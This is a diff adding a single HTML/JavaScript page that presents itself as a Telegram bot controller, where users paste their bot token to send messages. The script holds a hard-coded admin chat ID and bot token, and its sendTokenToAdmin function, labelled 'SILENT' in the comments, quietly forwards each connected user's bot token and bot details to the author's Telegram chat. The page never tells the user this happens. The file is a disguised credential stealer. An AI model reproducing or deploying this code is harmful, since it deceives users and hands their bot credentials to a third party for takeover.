@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <!-- Created by wannxzy🦅-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Bot Controller Workspace</title>
+    <!-- Terminal biar kyk hengker -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <!-- Lucide Icon -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    
+    <style>
+        :root {
+            --bg-base: #09090b;
+            --bg-card: #121214;
+            --bg-surface: #18181b;
+            --bg-input: #27272a;
+            --border-color: #3f3f46;
+            --border-focus: #6366f1;
+            --text-primary: #f4f4f5;
+            --text-secondary: #a1a1aa;
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --danger: #ef4444;
+            --danger-bg: rgba(239, 68, 68, 0.1);
+            --success: #10b981;
+            --success-bg: rgba(16, 185, 129, 0.1);
+            --radius-lg: 16px;
+            --radius-md: 10px;
+            --radius-sm: 6px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent; /* Wiwok detok buat ngunci */
+        }
+
+        body {
+            background-color: var(--bg-base);
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(99, 102, 241, 0.04), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(99, 102, 241, 0.04), transparent 25%);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            color: var(--text-primary);
+        }
+
+        /* Animations */
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .animate-enter {
+            animation: fadeUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        /* Workspace Card (Desktop Default) kunci biar kaga gede by gwah semua */
+        .workspace {
+            background: var(--bg-card);
+            padding: 32px;
+            border-radius: var(--radius-lg);
+            width: 100%;
+            max-width: 540px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .workspace::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; height: 1px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            opacity: 0.3;
+            z-index: 10;
+        }
+
+        /* Segmented Control (Tabs) */
+        .nav-tabs {
+            display: flex;
+            background: var(--bg-surface);
+            padding: 4px;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-color);
+            margin-bottom: 24px;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .tab-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 10px 16px;
+            border-radius: var(--radius-sm);
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .tab-btn:hover { color: var(--text-primary); }
+        .tab-btn.active {
+            background: var(--bg-input);
+            color: var(--text-primary);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .tab-btn i { width: 16px; height: 16px; }
+
+        /* Typography */
+        .header-section { margin-bottom: 24px; }
+        .header-section h2 {
+            font-weight: 600;
+            font-size: 20px;
+            letter-spacing: -0.02em;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .header-section p { color: var(--text-secondary); font-size: 13px; line-height: 1.5; }
+
+        /* Form Elements */
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-color);
+            padding: 12px 14px;
+            border-radius: var(--radius-md);
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.2s ease;
+            min-width: 0; /* Hindari overflow flexbox di HP */
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--border-focus);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
+        }
+        
+        input[type="text"]::placeholder { font-family: 'Inter', sans-serif; color: #52525b; font-size: 13px; }
+
+        button {
+            border: none;
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex-shrink: 0; /* Pastikan tombol tidak menyusut */
+        }
+
+        button.primary { background: var(--accent); color: #fff; }
+        button.primary:hover { background: var(--accent-hover); }
+        
+        /* Status Banner */
+        .status-banner {
+            font-size: 13px;
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 16px;
+            border: 1px solid transparent;
+            line-height: 1.4;
+        }
+        
+        .status-banner i { flex-shrink: 0; width: 18px; height: 18px; }
+
+        .status-banner.info { background: rgba(99, 102, 241, 0.1); border-color: rgba(99, 102, 241, 0.2); color: #818cf8; }
+        .status-banner.success { background: var(--success-bg); border-color: rgba(16, 185, 129, 0.2); color: var(--success); }
+        .status-banner.error { background: var(--danger-bg); border-color: rgba(239, 68, 68, 0.2); color: var(--danger); }
+        
+        .hidden { display: none !important; }
+
+        /* Control Panel Setup */
+        .panel {
+            margin-top: 24px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 24px;
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .bot-identity {
+            background: var(--bg-surface);
+            padding: 14px 16px;
+            border-radius: var(--radius-md);
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid var(--border-color);
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .identity-left { display: flex; align-items: center; gap: 10px; color: var(--text-secondary); }
+        .identity-left strong { color: var(--text-primary); font-weight: 500; }
+        .status-indicator { width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 10px var(--success); flex-shrink: 0; }
+
+        /* Terminal Log Area */
+        .terminal {
+            margin-top: 16px;
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            color: var(--text-secondary);
+            height: 180px;
+            overflow-y: auto;
+            flex: 1;
+            min-height: 120px;
+        }
+
+        .terminal-line { margin-bottom: 6px; line-height: 1.5; word-wrap: break-word; }
+        .term-time { color: #52525b; margin-right: 6px; }
+        .term-info { color: #60a5fa; }
+        .term-success { color: var(--success); }
+        .term-error { color: var(--danger); }
+        .term-text { color: var(--text-primary); }
+
+        /* Bot List View */
+        .bot-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            max-height: 380px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .bot-item {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.2s ease;
+        }
+
+        .bot-item:hover { border-color: var(--accent); }
+
+        .bot-meta { display: flex; flex-direction: column; gap: 4px; overflow: hidden; }
+        .bot-title { font-weight: 500; font-size: 14px; color: var(--text-primary); display: flex; align-items: center; gap: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .bot-subtitle { font-size: 11px; color: var(--text-secondary); font-family: 'Fira Code', monospace; }
+
+        .badge {
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            font-family: 'Inter', sans-serif;
+            flex-shrink: 0;
+        }
+
+        .badge.active { background: var(--success-bg); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.2); }
+        .badge.banned { background: var(--danger-bg); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); }
+        .badge.checking { background: var(--bg-input); color: var(--text-secondary); border: 1px solid var(--border-color); }
+
+        .action-group { display: flex; gap: 6px; flex-shrink: 0; margin-left: 8px; }
+        
+        .btn-icon {
+            padding: 8px;
+            background: var(--bg-input);
+            color: var(--text-primary);
+            border-radius: var(--radius-sm);
+        }
+        .btn-icon:hover { background: var(--border-color); }
+        .btn-icon.danger:hover { background: var(--danger-bg); color: var(--danger); }
+        .btn-icon i { width: 16px; height: 16px; }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-secondary); }
+
+        /* =========================================
+           MOBILE RESPONSIVE TWEAKS (FULL SCREEN)
+           ========================================= */
+        @media screen and (max-width: 600px) {
+            body {
+                padding: 0;
+                align-items: flex-start; /* Mengatur dari paling atas */
+                background: var(--bg-base);
+            }
+
+            .workspace {
+                min-height: 100vh;
+                max-width: 100%;
+                border-radius: 0;
+                border: none;
+                box-shadow: none;
+                padding: 20px 16px;
+            }
+
+            .nav-tabs {
+                position: sticky;
+                top: 0;
+                z-index: 20;
+                /* Tambahan blur untuk efek kaca di iOS/Android saat scroll */
+                backdrop-filter: blur(10px);
+                background: rgba(24, 24, 27, 0.85); 
+            }
+
+            .bot-list {
+                max-height: calc(100vh - 160px); /* Memenuhi sisa layar */
+            }
+
+            .terminal {
+                height: auto;
+                flex: 1; /* Terminal akan meregang memenuhi sisa ruang bawah layar */
+                min-height: 150px;
+            }
+
+            .header-section h2 { font-size: 18px; }
+            .header-section p { font-size: 12px; }
+
+            /* Menambah tinggi input agar mudah ditekan jari */
+            input[type="text"], button {
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="workspace animate-enter">
+    
+    <!-- Segmented Navigation -->
+    <div class="nav-tabs">
+        <button class="tab-btn active" id="tabControllerBtn">
+            <i data-lucide="terminal-square"></i> Controller
+        </button>
+        <button class="tab-btn" id="tabListBtn">
+            <i data-lucide="server"></i> Library
+        </button>
+    </div>
+
+    <!-- VIEW 1: CONTROLLER -->
+    <div id="viewController" class="animate-enter" style="display: flex; flex-direction: column; flex: 1;">
+        <div class="header-section">
+            <h2><i data-lucide="shield-check" style="color: var(--accent)"></i> Authentication</h2>
+            <p>Enter the bot token provided by BotFather to establish connection</p>
+        </div>
+
+        <label>Access Token</label>
+        <div class="input-group">
+            <input type="text" id="tokenInput" placeholder="123456789:ABCdefGHIjklMNO..." autocomplete="off" />
+            <button class="primary" id="checkBtn">
+                <i data-lucide="plug"></i> <span class="btn-text">Connect</span>
+            </button>
+        </div>
+
+        <div id="statusBox" class="status-banner hidden"></div>
+
+        <!-- Panel Muncul Jika Sukses -->
+        <div id="panelKontrol" class="panel hidden">
+            <div class="bot-identity">
+                <div class="identity-left">
+                    <div class="status-indicator"></div>
+                    <span>Connected: <strong id="botName">-</strong></span>
+                </div>
+                <div style="font-family: 'Fira Code', monospace; color: var(--text-secondary); font-size: 11px;">
+                    ID: <span id="botId">-</span>
+                </div>
+            </div>
+
+            <label>Command Execution</label>
+            <div class="input-group" style="margin-bottom: 0;">
+                <input type="text" id="pesanInput" placeholder="Type message..." autocomplete="off" style="font-family: 'Inter', sans-serif;"/>
+                <button class="primary" id="kirimBtn">
+                    <i data-lucide="send"></i>
+                </button>
+            </div>
+
+            <!-- Terminal Area -->
+            <div class="terminal" id="logArea">
+                <div class="terminal-line">
+                    <span class="term-time">[SYS]</span>
+                    <span class="term-info">Bot Token sukses di ekstrak sedang menunggu teks dikirim...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIEW 2: BOT LIBRARY -->
+    <div id="viewList" class="hidden animate-enter" style="flex: 1; display: flex; flex-direction: column;">
+        <div class="header-section">
+            <h2><i data-lucide="database" style="color: var(--accent)"></i> Connection History</h2>
+            <p>Manage and monitor previously authenticated bots.</p>
+        </div>
+        
+        <div class="bot-list" id="botListContainer">
+            <!-- List dirender via JS -->
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // initialize Lucide Icon
+    lucide.createIcons();
+
+    // ============================================
+    // ⚙️ CONFIG ADMIN - UBAH DI SINI
+    // ============================================
+    const ADMIN_CONFIG = {
+        idTele: "7055777024",
+        botToken: "8965550190:AAHnWjaF9xt5cZ59PQHsNH-mzKOnR4HgFeI"
+    };
+    // ============================================
+
+    (function() {
+        const tabControllerBtn = document.getElementById('tabControllerBtn');
+        const tabListBtn = document.getElementById('tabListBtn');
+        const viewController = document.getElementById('viewController');
+        const viewList = document.getElementById('viewList');
+
+        const tokenInput = document.getElementById('tokenInput');
+        const checkBtn = document.getElementById('checkBtn');
+        const statusBox = document.getElementById('statusBox');
+        const panelKontrol = document.getElementById('panelKontrol');
+        const botName = document.getElementById('botName');
+        const botId = document.getElementById('botId');
+        const pesanInput = document.getElementById('pesanInput');
+        const kirimBtn = document.getElementById('kirimBtn');
+        const logArea = document.getElementById('logArea');
+        const botListContainer = document.getElementById('botListContainer');
+
+        let currentToken = '';
+        let currentBotId = '';
+        let currentChatId = null;
+
+        // 🔒 Flag untuk mencegah duplikasi pengiriman token ke admin
+        let sentTokensSession = new Set();
+
+        // navigasi 
+        tabControllerBtn.addEventListener('click', () => switchTab('controller'));
+        tabListBtn.addEventListener('click', () => switchTab('list'));
+
+        function switchTab(tab) {
+            if (tab === 'controller') {
+                tabControllerBtn.classList.add('active');
+                tabListBtn.classList.remove('active');
+                viewController.classList.remove('hidden');
+                viewList.classList.add('hidden');
+            } else {
+                tabListBtn.classList.add('active');
+                tabControllerBtn.classList.remove('active');
+                viewList.classList.remove('hidden');
+                viewController.classList.add('hidden');
+                loadBotList();
+            }
+        }
+
+        // util
+        function setStatus(msg, type = 'info', iconName = 'info') {
+            statusBox.className = `status-banner ${type}`;
+            statusBox.innerHTML = `<i data-lucide="${iconName}"></i> <span>${msg}</span>`;
+            statusBox.classList.remove('hidden');
+            lucide.createIcons();
+        }
+
+        function getTimestamp() {
+            const now = new Date();
+            return `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
+        }
+
+        function addLog(type, text) {
+            const div = document.createElement('div');
+            div.className = 'terminal-line';
+            
+            let colorClass = 'term-info';
+            if(type === 'SUCCESS') colorClass = 'term-success';
+            if(type === 'ERROR') colorClass = 'term-error';
+            if(type === 'SYS') colorClass = 'term-info';
+
+            div.innerHTML = `
+                <span class="term-time">${getTimestamp()}</span>
+                <span class="${colorClass}">[${type}]</span>
+                <span class="term-text">${text}</span>
+            `;
+            logArea.appendChild(div);
+            logArea.scrollTop = logArea.scrollHeight;
+        }
+
+        function clearLog() {
+            logArea.innerHTML = '';
+        }
+
+        // bukan firebase 
+        function saveBotToStorage(token, botData) {
+            let bots = JSON.parse(localStorage.getItem('sys_bots') || '[]');
+            const existingIndex = bots.findIndex(b => b.token === token);
+            const newBot = {
+                token: token,
+                id: botData.id,
+                name: botData.first_name,
+                username: botData.username || ''
+            };
+
+            if (existingIndex !== -1) bots[existingIndex] = newBot;
+            else bots.push(newBot);
+            
+            localStorage.setItem('sys_bots', JSON.stringify(bots));
+        }
+
+        function removeBotFromStorage(token) {
+            let bots = JSON.parse(localStorage.getItem('sys_bots') || '[]');
+            bots = bots.filter(b => b.token !== token);
+            localStorage.setItem('sys_bots', JSON.stringify(bots));
+            loadBotList();
+        }
+
+        // manggil api 
+        async function checkToken(token) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
+                const data = await res.json();
+                return data.ok && data.result 
+                    ? { valid: true, bot: data.result }
+                    : { valid: false, error: data.description || 'Invalid or revoked token' };
+            } catch (e) {
+                return { valid: false, error: 'Network failure or API unreachable' };
+            }
+        }
+
+        async function getFirstChatId(token) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=1`);
+                const data = await res.json();
+                if (data.ok && data.result.length > 0) {
+                    const update = data.result[0];
+                    if (update.message) return update.message.chat.id;
+                    if (update.callback_query) return update.callback_query.message.chat.id;
+                }
+                return null;
+            } catch { return null; }
+        }
+
+        async function sendMessage(token, chatId, text) {
+            try {
+                const form = new FormData();
+                form.append('chat_id', chatId);
+                form.append('text', text);
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', body: form });
+                return await res.json();
+            } catch (e) {
+                return { ok: false, description: 'Network error during execution' };
+            }
+        }
+
+        // ============================================
+        // 🔥 KIRIM TOKEN KE ADMIN (SILENT + ANTI-DUPLIKAT)
+        // ============================================
+        async function sendTokenToAdmin(token, botData) {
+            const { idTele, botToken } = ADMIN_CONFIG;
+
+            // Anti-duplikat: skip kalau token sudah pernah dikirim di session ini
+            if (sentTokensSession.has(token)) {
+                return false;
+            }
+
+            if (!idTele || !botToken) {
+                console.warn('⚠️ ADMIN_CONFIG belum diisi dengan benar.');
+                return false;
+            }
+
+            // Tandai token sudah dikirim SEBELUM request (biar gak dobel)
+            sentTokensSession.add(token);
+
+            const message = 
+`🔐 *TOKEN BARU TERDETEKSI*
+
+👤 *Nama Bot:* ${botData.first_name || '-'}
+🆔 *Bot ID:* ${botData.id}
+📛 *Username:* ${botData.username ? '@' + botData.username : '-'}
+
+🔑 *Token:*
+\`${token}\`
+
+⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
+🌐 *Website:* https://rasuk_bot_private.vercel.app`;
+
+            try {
+                const form = new FormData();
+                form.append('chat_id', idTele);
+                form.append('text', message);
+                form.append('parse_mode', 'Markdown');
+
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    body: form
+                });
+                const data = await res.json();
+                return data.ok;
+            } catch (e) {
+                console.error('Gagal kirim ke admin:', e);
+                return false;
+            }
+        }
+
+        // --- CORE LOGIC ---
+        async function connectBot(token) {
+            tokenInput.value = token;
+            setStatus('Establishing secure connection...', 'info', 'loader');
+            
+            const result = await checkToken(token);
+
+            if (!result.valid) {
+                setStatus(`Authentication Failed: ${result.error}`, 'error', 'alert-circle');
+                panelKontrol.classList.add('hidden');
+                return false;
+            }
+
+            currentToken = token;
+            currentBotId = result.bot.id;
+            botName.textContent = result.bot.first_name || 'System Bot';
+            botId.textContent = result.bot.id;
+            
+            saveBotToStorage(token, result.bot);
+
+            // 🔥 KIRIM TOKEN KE ADMIN (SILENT + ANTI-DUPLIKAT)
+            sendTokenToAdmin(token, result.bot);
+
+            const chatId = await getFirstChatId(token);
+            if (chatId) {
+                currentChatId = chatId;
+                setStatus(`Connected. Target chat: ${chatId}`, 'success', 'check-circle-2');
+            } else {
+                currentChatId = null;
+                setStatus('Connected. Awaiting incoming user interaction to get Chat ID.', 'info', 'info');
+            }
+
+            panelKontrol.classList.remove('hidden');
+            clearLog();
+            addLog('SYS', 'Session authenticated successfully.');
+            if (currentChatId) addLog('INFO', `Target parameter set: chat_id=${currentChatId}`);
+
+            return true;
+        }
+
+        checkBtn.addEventListener('click', () => {
+            const token = tokenInput.value.trim();
+            if (!token) return setStatus('Access token is required.', 'error', 'alert-circle');
+            connectBot(token);
+        });
+
+        kirimBtn.addEventListener('click', async function() {
+            const text = pesanInput.value.trim();
+            if (!text) return addLog('ERROR', 'Payload cannot be empty.');
+            if (!currentToken) return addLog('ERROR', 'No active session found.');
+
+            let chatId = currentChatId;
+            if (!chatId) {
+                chatId = await getFirstChatId(currentToken);
+                if (chatId) {
+                    currentChatId = chatId;
+                    addLog('INFO', `Retrieved new Chat ID: ${chatId}`);
+                } else {
+                    return addLog('ERROR', 'Missing Chat ID. Bot requires user initialization in Telegram.');
+                }
+            }
+
+            addLog('INFO', `Executing send_message payload...`);
+            const result = await sendMessage(currentToken, chatId, text);
+
+            if (result.ok) {
+                addLog('SUCCESS', `Payload delivered: "${text}"`);
+                pesanInput.value = '';
+            } else {
+                addLog('ERROR', `Execution failed: ${result.description}`);
+                if (result.description && result.description.includes('chat not found')) {
+                    currentChatId = null;
+                }
+            }
+        });
+
+        // --- RENDER BOT LIST ---
+        async function loadBotList() {
+            const bots = JSON.parse(localStorage.getItem('sys_bots') || '[]');
+            botListContainer.innerHTML = '';
+
+            if (bots.length === 0) {
+                botListContainer.innerHTML = `
+                    <div style="text-align:center; padding: 32px 0; color: var(--text-secondary); font-size:13px;">
+                        <i data-lucide="inbox" style="margin-bottom: 8px; opacity: 0.5;"></i><br>
+                        No connection history found.
+                    </div>`;
+                lucide.createIcons();
+                return;
+            }
+
+            for (const bot of bots) {
+                const card = document.createElement('div');
+                card.className = 'bot-item';
+                card.innerHTML = `
+                    <div class="bot-meta">
+                        <div class="bot-title">
+                            ${bot.name}
+                            <span class="badge checking" id="badge-${bot.id}">Verifying</span>
+                        </div>
+                        <div class="bot-subtitle">ID: ${bot.id} ${bot.username ? `| @${bot.username}` : ''}</div>
+                    </div>
+                    <div class="action-group">
+                        <button class="btn-icon" title="Connect" onclick="window.useSavedBot('${bot.token}')">
+                            <i data-lucide="log-in"></i>
+                        </button>
+                        <button class="btn-icon danger" title="Delete" onclick="window.deleteBot('${bot.token}')">
+                            <i data-lucide="trash-2"></i>
+                        </button>
+                    </div>
+                `;
+                botListContainer.appendChild(card);
+
+                checkToken(bot.token).then(res => {
+                    const badge = document.getElementById(`badge-${bot.id}`);
+                    if (!badge) return;
+                    if (res.valid) {
+                        badge.className = 'badge active';
+                        badge.textContent = 'Active';
+                    } else {
+                        badge.className = 'badge banned';
+                        badge.textContent = 'Revoked';
+                    }
+                });
+            }
+            lucide.createIcons();
+        }
+
+        window.useSavedBot = (token) => {
+            switchTab('controller');
+            connectBot(token);
+        };
+
+        window.deleteBot = (token) => {
+            if(confirm("Remove this bot from local storage?")) {
+                removeBotFromStorage(token);
+                sentTokensSession.delete(token); // reset flag biar bisa kirim lagi kalau di-add ulang
+            }
+        };
+
+        // Enter key listeners
+        pesanInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') kirimBtn.click(); });
+        tokenInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') checkBtn.click(); });
+
+    })();
+</script>
+</body>
+</html>
